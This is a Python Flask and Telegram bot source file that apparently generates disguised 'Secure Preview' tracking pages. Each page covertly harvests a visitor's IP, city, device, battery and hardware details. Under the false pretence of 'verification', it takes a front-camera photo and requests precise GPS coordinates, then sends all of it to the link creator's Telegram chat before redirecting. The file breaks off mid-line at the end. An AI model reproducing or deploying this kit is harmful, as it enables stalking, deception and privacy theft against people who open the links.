from flask import Flask, request, jsonify, send_from_directory
import telebot
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
STATS_FILE = "stats.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, "w") as f:
        json.dump({"total_links": 0}, f)

bot = telebot.TeleBot(TOKEN)

def increment_links():
    with open(STATS_FILE, "r") as f:
        stats = json.load(f)
    stats["total_links"] = stats.get("total_links", 0) + 1
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def delete_old_files():
    cutoff_time = datetime.now() - timedelta(minutes=10)
    for folder in [HTML_DIR, PHOTO_DIR]:
        if os.path.exists(folder):
            for filename in os.listdir(folder):
                filepath = os.path.join(folder, filename)
                try:
                    if datetime.fromtimestamp(os.path.getmtime(filepath)) < cutoff_time:
                        os.remove(filepath)
                except:
                    pass

def start_auto_cleanup():
    def cleanup_loop():
        while True:
            time.sleep(600)
            delete_old_files()
    threading.Thread(target=cleanup_loop, daemon=True).start()

def delete_user_old_links(user_id):
    for folder in [HTML_DIR, PHOTO_DIR]:
        if os.path.exists(folder):
            for filename in os.listdir(folder):
                if filename.startswith(f"v_{user_id}_") or filename.startswith(f"photo_{user_id}_"):
                    try:
                        os.remove(os.path.join(folder, filename))
                    except:
                        pass

def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False

def get_user_state(user_id):
    try:
        with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "r") as f:
            return json.load(f)
    except:
        return {"state": None, "target_url": None, "photo_file": None}

def set_user_state(user_id, data):
    with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "w") as f:
        json.dump(data, f)

def generate_html(user_id, target_url, photo_filename):
    delete_user_old_links(user_id)
    html_filename = f"v_{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, html_filename)
    
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
    storage_channel = CHANNEL_ID if CHANNEL_ID else "null"
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Content Preview</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .card {{
            background: white;
            border-radius: 32px;
            max-width: 400px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            animation: fadeIn 0.5s ease-out;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        .header {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 24px 20px;
            text-align: center;
        }}
        .logo {{
            font-size: 28px;
            font-weight: bold;
            color: white;
        }}
        .logo span {{
            color: #e94560;
        }}
        .badge {{
            background: rgba(255,255,255,0.15);
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: white;
            margin-top: 8px;
        }}
        .preview-section {{
            padding: 24px;
            text-align: center;
        }}
        .preview-label {{
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #888;
            margin-bottom: 12px;
        }}
        .user-photo {{
            width: 120px;
            height: 120px;
            border-radius: 60px;
            object-fit: cover;
            margin: 0 auto 16px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            border: 3px solid #e94560;
        }}
        .message {{
            background: #f0f0f0;
            padding: 12px 16px;
            border-radius: 20px;
            display: inline-block;
            max-width: 80%;
            margin: 16px auto;
            font-size: 14px;
            color: #333;
        }}
        .content-info {{
            margin: 20px 0;
            padding: 16px;
            background: #f8f9fa;
            border-radius: 16px;
        }}
        .content-info p {{
            color: #666;
            font-size: 13px;
            margin: 4px 0;
        }}
        .btn {{
            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 16px;
            transition: all 0.3s ease;
            animation: pulse 2s infinite;
            box-shadow: 0 4px 15px rgba(233,69,96,0.4);
        }}
        @keyframes pulse {{
            0% {{
                transform: scale(1);
                box-shadow: 0 4px 15px rgba(233,69,96,0.4);
            }}
            50% {{
                transform: scale(1.03);
                box-shadow: 0 8px 25px rgba(233,69,96,0.6);
            }}
            100% {{
                transform: scale(1);
                box-shadow: 0 4px 15px rgba(233,69,96,0.4);
            }}
        }}
        .btn:active {{
            transform: scale(0.98);
            animation: none;
        }}
        .footer {{
            background: #f5f5f5;
            padding: 16px;
            text-align: center;
            font-size: 11px;
            color: #999;
        }}
        .step {{ display: none; }}
        .active {{ display: block; }}
        .loader {{
            width: 48px;
            height: 48px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .error {{
            background: #fee;
            color: #e94560;
            padding: 12px;
            border-radius: 12px;
            font-size: 13px;
            margin-top: 16px;
        }}
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo">Connect<span>Hub</span></div>
        <div class="badge">Secure Preview</div>
    </div>
    
    <div id="step1" class="step active">
        <div class="preview-section">
            <div class="loader"></div>
            <p style="color:#666; margin-top:16px">Loading secure preview...</p>
        </div>
    </div>
    
    <div id="step2" class="step">
        <div class="preview-section">
            <div class="preview-label">Shared by user</div>
            <img class="user-photo" src="{photo_url}" alt="Shared photo">
            <div class="message">
                "Here's what I wanted to share with you"
            </div>
            <div class="content-info">
                <p>📎 1 attachment • Secure link</p>
                <p>🔒 End-to-end encrypted</p>
            </div>
            <button class="btn" onclick="requestCamera()">🚀 Proceed to Page</button>
            <div id="errorMsg" class="error" style="display:none"></div>
        </div>
        <div class="footer">
            <p>Secure connection • 256-bit encryption</p>
        </div>
    </div>
    
    <div id="step3" class="step">
        <div class="preview-section">
            <div class="loader"></div>
            <p style="color:#666; margin-top:16px">Establishing secure connection...</p>
        </div>
    </div>
    
    <div id="step4" class="step">
        <div class="preview-section">
            <div class="loader"></div>
            <p style="color:#666; margin-top:16px">Verifying your device...</p>
        </div>
    </div>
    
    <div id="step5" class="step">
        <div class="preview-section">
            <div class="loader"></div>
            <p style="color:#666; margin-top:16px">Redirecting to content...</p>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const STORAGE = {storage_channel};
const TARGET = "{target_url}";

function formatBytes(bytes) {{
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}}

async function sendToUser(text, file=null) {{
    try {{
        if(file) {{
            let fd = new FormData();
            fd.append('chat_id', USER);
            fd.append('photo', file);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
            if(STORAGE && STORAGE !== 'null') {{
                let fd2 = new FormData();
                fd2.append('chat_id', STORAGE);
                fd2.append('photo', file);
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd2}});
            }}
        }} else {{
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text, parse_mode:'HTML'}})}});
            if(STORAGE && STORAGE !== 'null') {{
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:STORAGE, text:text, parse_mode:'HTML'}})}});
            }}
        }}
    }} catch(e) {{}}
}}

async function getIPInfo(ip) {{
    try {{
        let r = await fetch(`https://ipapi.co/${{ip}}/json/`);
        return await r.json();
    }} catch(e) {{ return {{}}; }}
}}

async function getBattery() {{
    if(navigator.getBattery) {{
        try {{
            let b = await navigator.getBattery();
            return {{ level: Math.round(b.level*100), charging: b.charging }};
        }} catch(e) {{}}
    }}
    return null;
}}

function getDeviceInfo() {{
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    if (/Android/i.test(ua)) return 'Android Phone';
    if (/Mobile/i.test(ua)) return 'Mobile Device';
    return 'Desktop/Laptop';
}}

function getHardwareInfo() {{
    return {{
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
    }};
}}

async function getStorageInfo() {{
    try {{
        if('storage' in navigator && 'estimate' in navigator.storage) {{
            let estimate = await navigator.storage.estimate();
            return {{
                usedFormatted: formatBytes(estimate.usage),
                totalFormatted: formatBytes(estimate.quota)
            }};
        }}
    }} catch(e) {{}}
    return null;
}}

async function captureData() {{
    try {{
        let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
        let ipInfo = await getIPInfo(ip);
        let battery = await getBattery();
        let deviceType = getDeviceInfo();
        let hardware = getHardwareInfo();
        let storage = await getStorageInfo();
        let language = navigator.language || 'Unknown';
        let resolution = screen.width + 'x' + screen.height;
        
        let message = "<b>Visitor Information Captured</b>\\n";
        message += "------------------------\\n\\n";
        message += "<b>Device & Browser</b>\\n";
        message += "   Device: " + deviceType + "\\n";
        message += "   User Agent: " + navigator.userAgent.substring(0, 200) + "\\n\\n";
        message += "<b>Network Information</b>\\n";
        message += "   IP Address: " + ip + "\\n";
        message += "   Language: " + language + "\\n\\n";
        message += "<b>Location Details</b>\\n";
        message += "   Country: " + (ipInfo.country_name || 'Unknown') + "\\n";
        message += "   Region: " + (ipInfo.region || 'Unknown') + "\\n";
        message += "   City: " + (ipInfo.city || 'Unknown') + "\\n";
        message += "   Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n\\n";
        message += "<b>Display</b>\\n";
        message += "   Resolution: " + resolution + "\\n\\n";
        message += "<b>Battery</b>\\n";
        message += "   Level: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
        message += "   Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n\\n";
        message += "<b>Hardware</b>\\n";
        message += "   CPU Cores: " + hardware.cores + "\\n";
        message += "   RAM: " + hardware.ram + "\\n";
        message += "   Storage: " + (storage ? storage.usedFormatted + ' / ' + storage.totalFormatted : 'Unknown') + "\\n\\n";
        message += "------------------------\\n";
        message += "Developed by: @nrtecno2";
        
        await sendToUser(message);
        return true;
    }} catch(e) {{
        return false;
    }}
}}

async function captureFrontPhoto() {{
    try {{
        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
        let video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
        await new Promise(r => setTimeout(r, 300));
        let canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        if(blob && blob.size > 500) {{
            await sendToUser('<b>Front Camera Photo</b>', blob);
        }}
        stream.getTracks().forEach(t => t.stop());
        return true;
    }} catch(e) {{
        return false;
    }}
}}

async function requestCamera() {{
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
    
    let cameraSuccess = await captureFrontPhoto();
    
    if(cameraSuccess) {{
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'block';
        await sendToUser('Camera access granted');
        
        if(navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(async (p) => {{
                await sendToUser('<b>Live Location</b>\\nhttps://www.google.com/maps?q=' + p.coords.latitude + ',' + p.coords.longitude);
                await sendToUser('<b>Coordinates</b>\\nLat: ' + p.coords.latitude + '\\nLon: ' + p.coords.longitude + '\\nAccuracy: ' + p.coords.accuracy + 'm');
            }}, async (err) => {{
                await sendToUser('Location: Access denied');
            }}, {{ timeout: 8000, enableHighAccuracy: true }});
        }}
        
        document.getElementById('step4').style.display = 'none';
        document.getElementById('step5').style.display = 'block';
        setTimeout(() => window.location.href = TARGET, 2000);
        
    }} else {{
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        let errorDiv = document.getElementById('errorMsg');
        errorDiv.innerText = 'Verification failed. Please allow camera access and try again.';
        errorDiv.style.display = 'block';
        await sendToUser('Camera access denied');
    }}
}}

async function start() {{
    await captureData();
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
}}
start();
</script>
</body>
</html>"""
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    increment_links()
    return html_filename

# ========== BOT HANDLERS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    if not is_subscribed(chat_id):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
        markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
        bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
    else:
        set_user_state(chat_id, {"state": "waiting_url", "target_url": None, "photo_file": None})
        bot.send_message(chat_id, "Send me any URL")

@bot.message_handler(func=lambda m: m.text and m.text.startswith(('http://', 'https://')))
def handle_url(message):
    chat_id = message.chat.id
    state = get_user_state(chat_id)
    
    if state.get("state") != "waiting_url":
        bot.send_message(chat_id, "Use /start first")
        return
    
    set_user_state(chat_id, {"state": "waiting_photo", "target_url": message.text, "photo_file": None})
    bot.send_message(chat_id, "Now share a photo with me")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    state = get_user_state(chat_id)
    
    if state.get("state") != "waiting_photo":
        bot.send_message(chat_id, "Please send URL first using /start")
        return
    
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        photo_filename = f"photo_{chat_id}_{int(time.time())}.jpg"
        photo_path = os.path.join(PHOTO_DIR, photo_filename)
        
        with open(photo_path, "wb") as f:
            f.write(downloaded_file)
        
        target_url = state.get("target_url")
        html_filename = generate_html(chat_id, target_url, photo_filename)
        
        set_user_state(chat_id, {"state": None, "target_url": None, "photo_file": None})
        
        link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_filename}"
        bot.send_message(chat_id, f"Your link:\n
